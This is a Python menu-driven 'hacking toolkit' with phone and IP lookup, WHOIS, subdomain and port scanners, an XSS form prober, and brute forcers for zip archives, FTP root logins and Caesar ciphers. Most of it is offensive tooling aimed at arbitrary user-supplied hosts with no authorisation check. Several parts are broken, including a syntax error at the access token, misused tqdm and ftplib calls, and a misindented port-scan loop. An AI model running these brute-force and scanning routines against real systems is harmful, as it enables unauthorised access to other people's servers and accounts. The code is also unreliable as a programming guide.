import phonenumbers, time, ipinfo, pprint, os, bs4, colorama, requests, socket, tqdm, zipfile, ftplib, whois, pyperclip
from phonenumbers import carrier, timezone
from colorama import Fore
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


GREEN = Fore.GREEN
RESET = Fore.RESET
GRAY = Fore.LIGHTBLACK_EX
RED = Fore.RED
BLUE = Fore.BLUE

def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)


def PhoneNumber():
    numInput = input("Enter Phone Number - (Ex. = +447777123456) > ")
    ro_number = phonenumbers.parse(numInput, "RO")
    gb_number = phonenumbers.parse(numInput, "GB")
    timezone_gb = timezone.time_zones_for_number(gb_number)
    x = carrier.name_for_number(ro_number, "en")
    print("Carrier: " + (x))
    print("Timezone: " + str((timezone_gb)))


def IPAddress():
    ipInput = input("Enter IP Address (Ex. 1.1.1.1) > ")
    access_token = # insert your own access token (see ipinfo github)
    handler = ipinfo.getHandler(access_token)
    ip_address = ipInput
    details = handler.getDetails(ip_address)
    pprint(details.all)


def scan_xss(url):
    # get all the forms from the URL
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    # returning value
    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
            # won't break because we want to print available vulnerable forms
    return is_vulnerable

def SDScanF():
  fileF = open("subdomain-100.txt")
  contentF = fileF.read()
  subdomainsF = contentF.splitlines()

  for subdomain in subdomainsF:
    urlF = f"http://{subdomain}.{domain_fast}"
    try:
      requests.get(urlF)
    except requests.ConnectionError:
      pass
    else:
      print("Subdomain discovered: ", urlF)

def SDScanM():
  fileM = open("subdomain-1000.txt")
  contentM = fileM.read()
  subdomainsM = contentM.splitlines()

  for subdomain in subdomainsM:
    urlM = f"http://{subdomain}.{domain_medium}"
    try:
      requests.get(urlM)
    except requests.ConnectionError:
      pass
    else:
      print("Subdomain discovered: ", urlM)

def SDScanFull():
  fileFull = open("subdomain-10k.txt")
  contentFull = fileFull.read()
  subdomainsFull = contentFull.splitlines()

  for subdomain in subdomainsFull:
    urlFull = f"http://{subdomain}.{domain_full}"
    try:
      requests.get(urlFull)
    except requests.ConnectionError:
      pass
    else:
      print("Subdomain discovered: ", urlFull)

def PortScan():

  def is_port_open(host, port):
    s = socket.socket()
    try:
      s.connect((host, port))
    except:
      return False
    else:
      return True

  for port in range(1, 1025):
   if is_port_open(host, port):
    print(f"{GREEN}[+] {host}:{port} is open   {RESET}")
  else:
    print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")

def ZipBF():
  wordlist = "wordlist.txt"
  zip_file = "filename.zip"
  zip_file = zipfile.ZipFile(zip_file)
  n_words = len(list(open(wordlist, "rb")))
  print("Total passwords to test: ", n_words)

  with open(wordlist, "rb") as wordlist:
    for word in tqdm(wordlist, total=n_words, unit="word"):
      try:
        zip_file.extractall(pwd=word.strip())
      except:
        continue
      else:
        print("Password found: ", word.decode().strip())
        exit(0)
  print("Password not found, try another wordlist.")

def FTPBF():
  user = "root"
  port = 21
  passwords = open("wordlist.txt").read().split("\n")

  def is_correct(password):
    server = ftplib.FTP()
    print(f"Trying: ", password)
    try:
      server.connect(host, port, timeout=5)
      server.login(user, password)
    except ftplib.error_perm():
      return False
    else:
      print(f"{Fore.GREEN}Found credentials: ", password, Fore.RESET)
      return True
    
  for password in passwords:
    if is_correct(password):
      break

def FileCMP():
  f1=open("file1.txt","r")
  f2=open("file2.txt","r")
  for line1 in f1:
    for line2 in f2:
        if line1==line2:
            print("SAME\n")
        else:
            print(line1 + line2)
        break
  f1.close()
  f2.close()

def CSBF():
 message = input("What string would you like to decrypt? > ")
 LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 for key in range(len(LETTERS)):
   translated = ''
   for symbol in message:
     if symbol in LETTERS:
       num = LETTERS.find(symbol)
       num = num - key

       if num < 0:
         num = num + len(LETTERS)
        
       translated = translated + LETTERS[num]
     else:
       translated = translated + symbol
   print('Key #%s: %s' % (key, translated))


print(Fore.RED)
print("                                                    ")
print("                   `/-`    `-/.                     ")
print("                `:ohs.        .sds:`                ")
print("            .+hNNs.            `sNNh+.              ")
print("           yMMMs`                `sMMMy             ")
print("           dMMM:                  :MMMd             ")
print("           mMMMo                  oMMMm             ")
print("           NMMMh      `:oo-`      hMMMN             ")
print("          `NMMMM  `.+ymMNNMmy+.`  MMMMN`            ")
print("          .MMMMM::smNmh+--+hmNms-:MMMMM.            ")
print("        .:yMMMMMNdyso-`    `:osydNMMMMMy:.          ")
print("   ./ymMMMMMMMMMMMMNdy--ydNMMMMMMMMMMMMmy/.         ")
print("  `-+hNMMMMMNmNMMMMMNhhhh//hhhhNMMMMMNmNMMMMMNh+-`  ")
print(" sdNMMMNmho:.:ssdNMMNo        oNMMNdsy-.:ohmNMMMNds ")
print(" MMNhs/-`    /MNs-odMMo      oMMdo-yNM-    `-/shNMM ")
print(" MMo         /MMh  `:+yy.  .yy+:`  dMM-         oMM ")
print(" Mm`         :MMh`   +MMm--mMM/   `dMM-         `mM ")
print(" M/          -dMMmy+--MMMNNMMM.-+hmMNd.          /M ")
print(" d            `-+hNMN:mMMMMMMm:NMmy+.`            d ")
print(" -                `:s/yMMMMMMy+o:`                - ")
print("                    :yNMMMMMMNy:                    ")
print("    `            -smMMMMMMMMMMMMmo-            `    ")
print("    ./+so/:.` .odMMMMMNho::odNMMMMMd+. `.:/os+/.    ")
print("     `:sdMNNMMMMMdo:`      `:odMMMMMNNMds:`         ")
print("         ./yNdo:`              `:sdNy/.             ")
time.sleep(3)
os.system('clear')


print(Fore.GREEN)
print(" ---   --      |  ---   --  |   |  ---     ")
print(" |  | |  | |\  |   |   |  | |   |  |  |    ")
print(" ---  |  | | \ |   |   |  | |   |  |--|    ")
print(" |  | |  | |  \|   |   |  | |   |  |   \   ")
print(" ---   --  |     --     --   ---   |    \ ")


print("                               ")
print("       Welcome to              ")
print("                               ")
print(" |-|-|   ----    |-|-|         ")
print("   |     |   |     |           ")
print("   |     |----     |           ")
print(" |-|-|   |       |-|-|         ")
print("                               ")
print(" IP      Phone   Info          ")
print("                               ")
print(" Options:                        ")
print("                                 ")
print(" 1| Phone Number                 ")
print(" 2| IP Address                   ")
print(" 3| XSS Vulnerability Scan       ")
print(" 4| Subdomain Scanner (Fast)     ")
print(" 5| Subdomain Scanner (Medium)   ")
print(" 6| Subdomain Scanner (Full)     ")
print(" 7| Port Scanner                 ")
print(" 8| Zip Brute Forcer             ")
print(" 9| FTP Brute Forcer             ")
print(" 10| SSH Brute Forcer (CLI Only) ")
print(" 11| Text File Comparer          ")
print(" 12| WHOIS Scan                  ")
print(" 13| Caesar Cipher Brute Forcer  ")
print(" Enter| Exit                     ")
print("                                 ")

Option = input("Option > ")

if Option == "1":
      PhoneNumber()

elif Option == "2":
      IPAddress()

elif Option == "3":
      url = input("Enter URL (e.g. https://google.com) > ")
      scan_xss(url)

elif Option == "4":
    domain_fast = input("Enter Domain to Scan (e.g. google.com) > ")
    SDScanF()

elif Option == "5":
    domain_medium = input("Enter Domain to Scan (e.g. google.com) > ")
    SDScanM()

elif Option == "6":
    domain_full = input("Enter Domain to Scan (e.g. google.com) > ")
    SDScanFull()

elif Option == "7":
    host = input("What host do you want to scan for ports? > ")
    PortScan()

elif Option == "8":
    print("This tool assumes that the name of your zip file is filename.zip and that the name of your wordlist is wordlist.txt.")
    ZipBF()

elif Option == "9":
    host = input("What FTP Server would you like to brute force? > ")
    FTPBF()

elif Option == "10":
    print("WARNING! The SSH Brute Forcer is for Command line only. See SSHBF.py for more details.")
    time.sleep(3)
    quit

elif Option == "11":
    print("Comparing files... (assumes that the files are named file1.txt and file2.txt)")
    FileCMP()

elif Option == "12":
    whois_scan = input("What IP or website would you like to scan? > ")
    scan = whois.whois(whois_scan)
    print(scan)

elif Option == "13":
    CSBF()


else:
      print("")
      print("------------")
      print("            ")
      print(" Exiting... ")
      print("            ")
      print("------------")
      quit
print("")
clearinput = input("Press Enter > ")
if clearinput == "":
    os.system("clear")
else:
    os.system("clear")